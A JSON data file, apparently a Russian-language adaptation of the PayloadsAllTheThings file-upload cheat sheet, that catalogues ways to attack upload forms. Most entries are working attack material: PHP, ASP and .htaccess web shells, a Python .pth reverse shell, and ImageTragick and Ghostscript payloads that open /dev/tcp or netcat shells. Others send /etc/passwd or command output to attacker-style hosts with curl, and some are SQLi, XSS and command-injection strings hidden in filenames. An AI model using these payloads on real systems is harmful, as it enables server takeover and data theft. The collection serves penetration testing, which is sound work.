@@ -1,0 +1,416 @@
+{
+  "category": "Upload Insecure Files",
+  "source": "PayloadsAllTheThings/Upload Insecure Files/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Майндмэп проверки загрузки файлов",
+      "language": "image",
+      "tags": ["methodology", "upload", "mindmap"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/upload-insecure-files/file-upload-mindmap.png",
+        "caption": "Дерево принятия решений при тесте формы загрузки: что проверять на стороне клиента и сервера (расширение, content-type, magic bytes, обработка файла после загрузки). Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Суть уязвимости и где искать",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Загруженные файлы опасны, если обрабатываются неправильно. Атакующий шлёт multipart/form-data POST со специально подобранными filename или MIME-типом и добивается выполнения кода.\n\nДве разные поверхности атаки:\n• Сам факт загрузки исполняемого файла (web shell) → RCE.\n• Как файл обрабатывается ПОСЛЕ загрузки (имя файла, ресайз, конвертация, распаковка) → SQLi/XSS/LFI/XXE/RCE.\n\nПорядок проверки: расширение → content-type → magic bytes → содержимое (полиглоты, картинки с кодом) → имя файла → пост-обработка (ImageMagick/ffmpeg/zip)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Опасные расширения по технологиям",
+      "language": "table",
+      "tags": ["methodology", "extensions", "fingerprint"],
+      "body": "php asp jsp perl coldfusion nodejs",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Технология", "Расширения для web shell"],
+          "rows": [
+            ["PHP", ".php .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc"],
+            ["ASP / IIS", ".asp .aspx .config .cer (IIS<=7.5) .asa (IIS<=7.5) .soap"],
+            ["JSP", ".jsp .jspx .jsw .jsv .jspf .wss .do .actions"],
+            ["Perl", ".pl .pm .cgi .lib"],
+            ["Coldfusion", ".cfm .cfml .cfc .dbm"],
+            ["Node.js", ".js .json .node"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Расширения для смежных уязвимостей",
+      "language": "table",
+      "tags": ["methodology", "extensions"],
+      "body": "svg gif csv xml avi js zip html",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Расширение", "Что можно вызвать"],
+          "rows": [
+            [".svg", "XXE, XSS, SSRF"],
+            [".gif", "XSS"],
+            [".csv", "CSV Injection"],
+            [".xml", "XXE"],
+            [".avi", "LFI, SSRF"],
+            [".js", "XSS, Open Redirect"],
+            [".zip", "RCE, DOS, LFI Gadget"],
+            [".html", "XSS, Open Redirect"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Обход расширения",
+      "title": "Двойное и обратное двойное расширение",
+      "language": "text",
+      "tags": ["bypass", "extension", "double-extension"],
+      "body": "Двойное расширение:\n.jpg.php\n.png.php5\n\nОбратное двойное расширение (для кривых конфигов Apache, где исполняется всё с .php в имени, даже не в конце):\n.php.jpg"
+    },
+    {
+      "subcategory": "Обход расширения",
+      "title": "Смена регистра",
+      "language": "text",
+      "tags": ["bypass", "extension", "case"],
+      "body": ".pHp\n.pHP5\n.PhAr"
+    },
+    {
+      "subcategory": "Обход расширения",
+      "title": "Null-byte (работает против pathinfo())",
+      "language": "text",
+      "tags": ["bypass", "extension", "null-byte"],
+      "body": ".php%00.gif\n.php\\x00.gif\n.php%00.png\n.php\\x00.png\n.php%00.jpg\n.php\\x00.jpg"
+    },
+    {
+      "subcategory": "Обход расширения",
+      "title": "Спецсимволы: точки, пробелы, переводы строк",
+      "language": "text",
+      "tags": ["bypass", "extension", "special-chars"],
+      "body": "Несколько точек в конце: file.php......   (Windows при создании обрезает точки в конце).\n\nПробел и переводы строк:\nfile.php%20\nfile.php%0d%0a.jpg\nfile.php%0a\n\nRight-to-Left Override (RTLO): name.%E2%80%AEphp.jpg отобразится как name.gpj.php\n\nСлэши:\nfile.php/\nfile.php.\\\nfile.j\\sp\nfile.j/sp\nНесколько спецсимволов: file.jsp/././././.\n\nUTF8 в имени: Content-Disposition: form-data; name=\"anyBodyParam\"; filename*=UTF8''myfile%0a.txt"
+    },
+    {
+      "subcategory": "Обход расширения",
+      "title": "Особенности Windows: обрезка хвоста имени",
+      "language": "text",
+      "tags": ["bypass", "extension", "windows"],
+      "body": "На Windows include / require / require_once вернут \"foo.php\", если после него идут символы:\n\\x20 ( )  \\x22 (\")  \\x2E (.)  \\x3C (<)  \\x3E (>)\n\nfopen и move_uploaded_file вернут \"foo.php\", если после идут:\n\\x2E (.)  \\x2F (/)  \\x5C (\\)\n\nПри PHP на IIS часть символов конвертируется при сохранении (можно перезаписать web.config через web<<):\n\\x3E (>) → \\x3F (?)\n\\x3C (<) → \\x2A (*)\n\\x22 (\") → \\x2E (.)   — в запросе заголовок Content-Disposition должен использовать одинарные кавычки, напр. filename='web\"config'"
+    },
+    {
+      "subcategory": "Обход расширения",
+      "title": "NTFS Alternate Data Stream (ADS)",
+      "language": "text",
+      "tags": ["bypass", "windows", "ads"],
+      "body": "Двоеточие \":\" вставляется после запрещённого расширения и перед разрешённым. На сервере создастся пустой файл с запрещённым расширением (напр. file.asax:.jpg), который потом можно править через short filename.\n\nШаблон ::$DATA позволяет создавать непустые файлы; точка после него обходит дополнительные фильтры:\nfile.asp::$data."
+    },
+    {
+      "subcategory": "Обход content-type",
+      "title": "Подмена Content-Type на image/*",
+      "language": "text",
+      "tags": ["bypass", "content-type", "mime"],
+      "body": "Меняем Content-Type запрещённого файла (application/x-php, application/octet-stream) на разрешённый картиночный:\n\nContent-Type: image/gif\nContent-Type: image/png\nContent-Type: image/jpeg\n\nПриёмы: указать Content-Type дважды (один запрещённый, один разрешённый); проверить, какой именно из них берёт сервер."
+    },
+    {
+      "subcategory": "Обход content-type",
+      "title": "Опасные PHP content-type (если фильтр на whitelist)",
+      "language": "text",
+      "tags": ["bypass", "content-type", "php"],
+      "body": "text/php\ntext/x-php\napplication/php\napplication/x-php\napplication/x-httpd-php\napplication/x-httpd-php-source"
+    },
+    {
+      "subcategory": "Magic bytes",
+      "title": "Сигнатуры файлов для подмены",
+      "language": "table",
+      "tags": ["bypass", "magic-bytes", "signature"],
+      "body": "png jpg gif magic bytes signature",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Тип", "Magic bytes (префикс)"],
+          "rows": [
+            ["PNG", "\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03["],
+            ["JPG", "\\xff\\xd8\\xff"],
+            ["GIF", "GIF87a   или   GIF8;"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Magic bytes",
+      "title": "Как это работает",
+      "language": "text",
+      "tags": ["bypass", "magic-bytes"],
+      "body": "Иногда сервер определяет тип файла по первым байтам-сигнатуре. Добавив/заменив их в начале файла, можно обмануть проверку — например, дописать GIF8; перед PHP-кодом, чтобы файл прошёл как GIF, но интерпретировался как PHP."
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Классический one-liner phpinfo",
+      "language": "php",
+      "tags": ["php", "webshell", "phpinfo"],
+      "body": "<?php phpinfo(); ?>"
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Tiny shell через короткий тег <?=",
+      "language": "php",
+      "tags": ["php", "webshell", "rce"],
+      "body": "<?=`$_GET[0]`?>\n<!-- tiny.php?0=ls -->"
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Шелл без тега <?php (через <script language=\"php\">)",
+      "language": "php",
+      "tags": ["php", "webshell", "bypass"],
+      "body": "<script language=\"php\">system(\"id\");</script>"
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Шорткат <?= вместо <?php echo",
+      "language": "php",
+      "tags": ["php", "webshell"],
+      "body": "<?=`id`?>"
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "AddType — заставить Apache исполнять любое расширение как PHP",
+      "language": "text",
+      "tags": ["htaccess", "apache", "rce"],
+      "body": "Загружаем .htaccess с директивой AddType, затем любой файл с расширением .rce:\n\nAddType application/x-httpd-php .rce\n\nСинтаксис: AddType mime-type extension [extension ...]\nВажно: .htaccess действует только на свою папку и подпапки."
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "Self-contained .htaccess web shell (htshell)",
+      "language": "text",
+      "tags": ["htaccess", "apache", "webshell", "rce"],
+      "body": "# Self contained .htaccess web shell - Part of the htshell project\n# Written by Wireghoul - http://www.justanotherhacker.com\n\n# Override default deny rule to make .htaccess file accessible over web\n<Files ~ \"^\\.ht\">\nOrder allow,deny\nAllow from all\n</Files>\n\n# Make .htaccess file be interpreted as php file. This occur after apache has interpreted\n# the apache directoves from the .htaccess file\nAddType application/x-httpd-php .htaccess\n\n###### SHELL ###### <?php echo \"\\n\";passthru($_GET['c'].\" 2>&1\"); ?>###### LLEHS ######"
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "Полиглот .htaccess/image (обход exif_imagetype)",
+      "language": "text",
+      "tags": ["htaccess", "polyglot", "bypass"],
+      "body": "Если на сервере тип картинки проверяется через exif_imagetype, делаем полиглот .htaccess/image. В .htaccess строки, начинающиеся с \\x00 и #, игнорируются — поэтому подходят форматы XBM и WBMP.\n\nГенерация .htaccess/xbm:\nwidth = 50\nheight = 50\npayload = '# .htaccess file'\n\nwith open('.htaccess', 'w') as htaccess:\n    htaccess.write('#define test_width %d\\n' % (width, ))\n    htaccess.write('#define test_height %d\\n' % (height, ))\n    htaccess.write(payload)"
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "Полиглот .htaccess/wbmp",
+      "language": "text",
+      "tags": ["htaccess", "polyglot", "bypass"],
+      "body": "type_header = b'\\x00'\nfixed_header = b'\\x00'\nwidth = b'50'\nheight = b'50'\npayload = b'# .htaccess file'\n\nwith open('.htaccess', 'wb') as htaccess:\n    htaccess.write(type_header + fixed_header + width + height)\n    htaccess.write(b'\\n')\n    htaccess.write(payload)"
+    },
+    {
+      "subcategory": "web.config",
+      "title": "web.config с ASP-шеллом (IIS)",
+      "language": "xml",
+      "tags": ["web.config", "iis", "asp", "rce"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!--\n<% Response.write(\"-\"&\"->\")%>\n<%\nSet oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\nSet oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\nSet oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\n\nFunction getCommandOutput(theCommand)\n    Dim objShell, objCmdExec\n    Set objShell = CreateObject(\"WScript.Shell\")\n    Set objCmdExec = objshell.exec(thecommand)\n\n    getCommandOutput = objCmdExec.StdOut.ReadAll\nend Function\n%>\n\n<BODY>\n<FORM action=\"\" method=\"GET\">\n<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">\n<input type=\"submit\" value=\"Run\">\n</FORM>\n\n<PRE>\n<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>\n<%Response.Write(Request.ServerVariables(\"server_name\"))%>\n<%Response.Write(Request.ServerVariables(\"server_port\"))%>\n<%Response.Write(Request.ServerVariables(\"server_software\"))%>\n<%Response.Write(Request.ServerVariables(\"LOCAL_ADDR\"))%>\n<% szCMD = request(\"cmd\")\nthisDir = getCommandOutput(\"cmd /c\" & szCMD)\nResponse.Write(thisDir)%>\n</PRE>\n</BODY>\n<%Response.write(\"<!-\"&\"-\") %>\n-->"
+    },
+    {
+      "subcategory": "Конфиги для RCE",
+      "title": "uwsgi.ini — RCE через оператор @(exec://)",
+      "language": "text",
+      "tags": ["uwsgi", "config", "rce"],
+      "body": "uWSGI .ini поддерживает «магические» переменные. Оператор @(...) включает содержимое; схема exec:// читает stdout процесса. Выполнится при парсинге конфига (рестарт, краш, autoreload).\n\n[uwsgi]\n; read from a symbol\nfoo = @(sym://uwsgi_funny_function)\n; read from binary appended data\nbar = @(data://[ATTACKER.DOMAIN.TLD])\n; read from http\ntest = @(http://[ATTACKER.DOMAIN.TLD])\n; read from a file descriptor\ncontent = @(fd://[ATTACKER.DOMAIN.TLD])\n; read from a process stdout\nbody = @(exec://whoami)\n; call a function returning a char *\ncharacters = @(call://uwsgi_func)"
+    },
+    {
+      "subcategory": "Конфиги для RCE",
+      "title": "Python .pth — выполнение кода при старте интерпретатора",
+      "language": "text",
+      "tags": ["python", "pth", "rce", "persistence"],
+      "body": "Если положить .pth в site-packages / dist-packages, модуль site обрабатывает его при каждом старте Python. Строка с import выполнится при любом запуске интерпретатора в этом окружении.\n\nПути узнаём через: python3 -m site\nТипичные: /usr/lib/pythonX.Y/site-packages/, /usr/local/lib/pythonX.Y/dist-packages/\n\nПример reverse shell (одна строка в .pth):\nimport socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"
+    },
+    {
+      "subcategory": "Конфиги для RCE",
+      "title": "Менеджеры зависимостей: package.json / composer.json",
+      "language": "text",
+      "tags": ["config", "rce", "dependency"],
+      "body": "Иногда можно загрузить JSON и перезаписать конфиг менеджера зависимостей — скрипты выполнятся.\n\npackage.json:\n\"scripts\": {\n    \"prepare\" : \"/bin/touch /tmp/pwned.txt\"\n}\n\ncomposer.json:\n\"scripts\": {\n    \"pre-command-run\" : [\n    \"/bin/touch /tmp/pwned.txt\"\n    ]\n}"
+    },
+    {
+      "subcategory": "Конфиги для RCE",
+      "title": "Jetty RCE — загрузка XML-контекста",
+      "language": "xml",
+      "tags": ["jetty", "java", "rce"],
+      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE Configure PUBLIC \"-//Jetty//Configure//EN\" \"https://www.eclipse.org/jetty/configure_10_0.dtd\">\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n    <Call class=\"java.lang.Runtime\" name=\"getRuntime\">\n        <Call name=\"exec\">\n            <Arg>\n                <Array type=\"String\">\n                    <Item>/bin/sh</Item>\n                    <Item>-c</Item>\n                    <Item>curl -F \"r=`id`\" http://yourServer:1337/</Item>\n                </Array>\n            </Arg>\n        </Call>\n    </Call>\n</Configure>"
+    },
+    {
+      "subcategory": "Server Side Include",
+      "title": "SSI — выполнение команды и инклюд файла",
+      "language": "text",
+      "tags": ["ssi", "shtml", "rce", "lfi"],
+      "body": "Загружаем .shtml / .stm с SSI-директивами (если на сервере включён SSI):\n\nВыполнить команду (exec.shtml):\n<!--#exec cmd=\"whoami\" -->\n\nИнклюднуть файл (include.shtml):\n<!--#include file=\"..\\..\\web.config\" -->"
+    },
+    {
+      "subcategory": "SVG / XML → XXE/SSRF",
+      "title": "SVG → чтение файла через ImageMagick (text:)",
+      "language": "xml",
+      "tags": ["svg", "xxe", "lfi", "imagemagick"],
+      "body": "<svg width=\"1000\" height=\"1000\" \nxmlns:xlink=\"http://www.w3.org/1999/xlink\">\nxmlns=\"http://www.w3.org/2000/svg\">       \n<image xlink:href=\"text:/etc/passwd\" height=\"500\" width=\"500\"/>\n</svg>"
+    },
+    {
+      "subcategory": "SVG / XML → XXE/SSRF",
+      "title": "SVG → чтение файла как HTML (html:)",
+      "language": "xml",
+      "tags": ["svg", "lfi", "imagemagick"],
+      "body": "<svg width=\"1000\" height=\"1000\" \nxmlns:xlink=\"http://www.w3.org/1999/xlink\">\nxmlns=\"http://www.w3.org/2000/svg\">       \n<image xlink:href=\"html:/etc/passwd\" height=\"500\" width=\"500\"/>\n</svg>"
+    },
+    {
+      "subcategory": "SVG / XML → XXE/SSRF",
+      "title": "HTML-файл с XSS",
+      "language": "text",
+      "tags": ["html", "xss"],
+      "body": "Загружаем .html для срабатывания XSS при открытии:\n<script>alert('XSS')</script>"
+    },
+    {
+      "subcategory": "Имя файла (filename)",
+      "title": "Пейлоады прямо в имени файла",
+      "language": "text",
+      "tags": ["filename", "sqli", "xss", "lfi"],
+      "body": "Иногда уязвимо не сама загрузка, а обработка имени файла потом. Кладём пейлоад в filename:\n\nTime-Based SQLi:  poc.js'(select*from(select(sleep(20)))a)+'.extension\nLFI / Path Traversal:  image.png../../../../../../../etc/passwd\nXSS:  '\"><img src=x onerror=alert(document.domain)>.extension\nFile Traversal:  ../../../tmp/lol.png\nCommand Injection:  ; sleep 10;"
+    },
+    {
+      "subcategory": "Антивирус",
+      "title": "EICAR — проверка наличия антивируса",
+      "language": "text",
+      "tags": ["eicar", "antivirus", "detection"],
+      "body": "Загрузи EICAR-файл, чтобы понять, стоит ли на сервере антивирус (если файл режется/блокируется — AV есть):\n\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+    },
+    {
+      "subcategory": "Картинка + код (Picture)",
+      "title": "Идея: валидная картинка с PHP-кодом + LFI",
+      "language": "text",
+      "tags": ["picture", "lfi", "rce", "bypass"],
+      "body": "Создаём валидную картинку, хранящую PHP-код, загружаем её и через Local File Inclusion исполняем код.\nВызов шелла: curl 'http://localhost/test.php?0=system' --data \"1='ls'\"\n\nДва способа спрятать код:\n• Picture Metadata — пейлоад в комментарии EXIF.\n• Picture Resize — пейлоад внутри сжатия, чтобы пережить ресайз и обойти getimagesize() / imagecreatefromgif()."
+    },
+    {
+      "subcategory": "Картинка + код (Picture)",
+      "title": "EXIF-комментарий с PHP (exiftool)",
+      "language": "text",
+      "tags": ["picture", "exif", "metadata", "rce"],
+      "body": "Создаём картинку и вставляем PHP в EXIF-тег Comment:\n\nconvert -size 110x110 xc:white payload.jpg\nexiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg\nexiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg"
+    },
+    {
+      "subcategory": "Картинка + код (Picture)",
+      "title": "PNG с PLTE-чанком, переживающий imagepng() (PHP-GD)",
+      "language": "php",
+      "tags": ["picture", "png", "bypass", "rce"],
+      "body": "<?php \n//createPNGwithPLTE.php\n// bypass imageCreateFromPng and imagepng \n$_payload=\"<?php phpinfo()?> \";\n$_pay_len=strlen($_payload);\nif(strlen($_payload)%3!=0){\n echo \"payload%3==0 !\"; exit();\n}\n\n\n$width=$_pay_len/3;\n$height=20;\n//$im = imageCreateFromPng(\"existing.png\");\n$im = imagecreate($width, $height);\n\n$_hex=unpack('H*',$_payload);\n$_chunks=str_split($_hex[1], 6);\n\nfor($i=0; $i < count($_chunks); $i++){\n\n  $_color_chunks=str_split($_chunks[$i], 2);\n  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));\n\n  imagesetpixel($im,$i,1,$color);\n\n}\n\nimagepng($im,\"example.png\");"
+    },
+    {
+      "subcategory": "Картинка + код (Picture)",
+      "title": "GIF с Global Color Table, переживающий imagegif()",
+      "language": "php",
+      "tags": ["picture", "gif", "bypass", "rce"],
+      "body": "<?php\n// createGIFwithGlobalColorTable.php\n$_file=\"example.gif\";\n$_payload=\"<?php evil();?>\";\n$_width=200;\n$_height=200;\nif(strlen($_payload)%3!=0){\n echo \"payload%3==0 !\"; exit();\n}\n$im = imagecreate($_width, $_height);\n$_hex=unpack('H*',$_payload);\n\n$colors_hex=str_split($_hex[1], 6);\n\nfor($i=0; $i < count($colors_hex); $i++){\n  $_color_chunks=str_split($colors_hex[$i], 2);\n  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));\n  imagesetpixel($im,$i,1,$color);\n}\n\nimagegif($im,$_file);\n?>"
+    },
+    {
+      "subcategory": "Картинка + код (Picture)",
+      "title": "PNG с шеллом в метаданных (Pillow)",
+      "language": "text",
+      "tags": ["picture", "png", "metadata", "rce"],
+      "body": "from __future__ import print_function\nfrom PIL import Image\n\n# Shellcodes - Bypass included : Keyword Recognition : System, GET, php\n# --- How to use : http://localhost/shell.php?c=echo%20'<pre>';ls\n\n#shellcode  = \"<?=@`$_GET[c]`;\"\nshellcode = \"<?php system($_GET['c']); ?>\"\n# --- How to use : http://localhost/shell.php?_=system&__=echo%20'<pre>';ls\nshellcode2 = \"<?='Sh3ll'; $_='{';$_=($_^'<').($_^'>;').($_^'/');?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>\"\n\nim = Image.new(\"RGB\", (10,10), \"Black\")\nim.info[\"shell\"] = shellcode\nreserved = ('interlace', 'gamma', 'dpi', 'transparency', 'aspect')\n\nfrom PIL import PngImagePlugin\nmeta = PngImagePlugin.PngInfo()\n\nfor k,v in im.info.items():\n\tif k in reserved: continue\n\tmeta.add_text(k, v, 0)\nim.save(\"payload.png\", \"PNG\", pnginfo=meta)"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "CVE-2016-3714 — суть и триггер",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "cve", "rce"],
+      "body": "Если бэкенд использует ImageMagick для ресайза/конвертации картинок, можно эксплуатировать ImageTragick (ImageMagick 7.0.1-1). Загружаем пейлоад с расширением картинки.\nТриггерится командой: convert shellexec.jpeg whatever.gif"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 — reverse shell через fill url()",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "rce", "reverse-shell"],
+      "body": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)'\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 — bind shell через netcat",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "rce", "bind-shell"],
+      "body": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/image.jpg\"|nc -l -p 7777 -e\"/bin/sh)'\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 — reverse shell через image over /dev/tcp",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "rce", "reverse-shell"],
+      "body": "push graphic-context\nencoding \"UTF-8\"\nviewbox 0 0 1 1\naffine 1 0 0 1 0 0\npush graphic-context\nimage Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'\npop graphic-context\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 — exfil /etc/passwd на Burp Collaborator",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "exfil", "ssrf"],
+      "body": "push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 \"|curl -d \"@/etc/passwd\" -X POST https://xxx.burpcollaborator.net/test1 \")' pop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 — wget через image over",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "ssrf"],
+      "body": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 127.0.0.1:1337 > /dev/null`'\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 — SVG/XML reverse shell (nc.traditional)",
+      "language": "xml",
+      "tags": ["imagemagick", "imagetragick", "svg", "reverse-shell"],
+      "body": "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg width=\"640px\" height=\"480px\" version=\"1.1\"\nxmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\n\"http://www.w3.org/1999/xlink\">\n<image xlink:href=\"https://example.com/image.jpg&quot;|/bin/nc.traditional 127.0.0.1 4242 -e /bin/bash&quot;\"\nx=\"0\" y=\"0\" height=\"640px\" width=\"480px\"/>\n</svg>"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #3 — Ghostscript: выполнить id",
+      "language": "text",
+      "tags": ["imagemagick", "ghostscript", "rce"],
+      "body": "%!PS\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%id) currentdevice putdeviceprops"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "Ghostscript — reverse shell через bash /dev/tcp",
+      "language": "text",
+      "tags": ["imagemagick", "ghostscript", "reverse-shell"],
+      "body": "%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1') currentdevice putdeviceprops"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "Ghostscript — callback через curl",
+      "language": "text",
+      "tags": ["imagemagick", "ghostscript", "ssrf"],
+      "body": "%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%curl http://attacker.com/?a=callback) currentdevice putdeviceprops"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "CVE-2022-44268 — чтение файла через PNG (info disclosure)",
+      "language": "text",
+      "tags": ["imagemagick", "cve", "lfi", "disclosure"],
+      "body": "Information disclosure в ImageMagick: создаём PNG, при обработке которого утекает содержимое файла сервера.\n\n# Генерация пейлоада\napt-get install pngcrush imagemagick exiftool exiv2 -y\npngcrush -text a \"profile\" \"/etc/passwd\" exploit.png\n\n# Триггер: бэкенд делает что-то вроде convert pngout.png pngconverted.png\n# Скачать результат и посмотреть: identify -verbose pngconverted.png\n# Раскодировать утёкшие данные:\npython3 -c 'print(bytes.fromhex(\"HEX_FROM_FILE\").decode(\"utf-8\"))'"
+    },
+    {
+      "subcategory": "FFmpeg HLS",
+      "title": "CVE FFmpeg HLS — чтение файла через AVI с HLS-плейлистом",
+      "language": "text",
+      "tags": ["ffmpeg", "cve", "lfi", "ssrf"],
+      "body": "FFmpeg при обработке видео можно заставить читать произвольные файлы через вредоносный HLS-плейлист внутри AVI (GAB2).\n\n1. ./gen_xbin_avi.py file://<filename> file_read.avi\n2. Загрузить file_read.avi на сайт, который обрабатывает видео\n3. На сервере выполнится: ffmpeg -i file_read.avi output.mp4\n4. Нажать \"Play\" в видеосервисе\n5. Если повезёт — увидишь содержимое <filename> с сервера\n\nГенерируемый плейлист:\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nGOD.txt\n#EXTINF:1.0\n/etc/passwd\n#EXT-X-ENDLIST"
+    },
+    {
+      "subcategory": "ZIP / архивы",
+      "title": "ZIP с symlink на /etc/passwd",
+      "language": "text",
+      "tags": ["zip", "symlink", "lfi"],
+      "body": "Если сервер распаковывает ZIP и отдаёт содержимое — упаковываем симлинк на /etc/passwd. После распаковки чтение «файла» вернёт целевой системный файл.\n\nln -s /etc/passwd link\nzip --symlinks test.zip link"
+    },
+    {
+      "subcategory": "Инструменты",
+      "title": "Инструменты для тестирования загрузки",
+      "language": "text",
+      "tags": ["tools", "methodology"],
+      "body": "• Fuxploider — сканер и эксплуатация уязвимостей загрузки файлов (github.com/almandin/fuxploider).\n• Burp Upload Scanner — BApp для проверки загрузки через Burp Proxy.\n• ZAP FileUpload — аддон OWASP ZAP для поиска уязвимостей в формах загрузки."
+    }
+  ]
+}
